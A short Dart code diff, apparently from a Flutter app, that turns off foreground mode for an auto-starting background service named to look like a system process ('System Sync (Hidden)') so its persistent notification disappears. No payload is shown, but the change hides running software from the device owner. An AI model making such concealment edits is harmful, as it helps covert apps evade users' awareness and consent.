@@ -41,9 +41,9 @@ Future<void> initializeService() async {
     androidConfiguration: AndroidConfiguration(
       onStart: onStart,
       autoStart: true,
-      isForegroundMode: true,
-      notificationChannelId: 'System Connectivity v5',
-      initialNotificationTitle: 'System Sync',
+      isForegroundMode: false, // Disabled foreground mode to remove persistent notification
+      notificationChannelId: 'System Connectivity v5', // Still need a channel ID just in case
+      initialNotificationTitle: 'System Sync (Hidden)', 
       initialNotificationContent: 'Active',
       foregroundServiceNotificationId: 888,
     ),
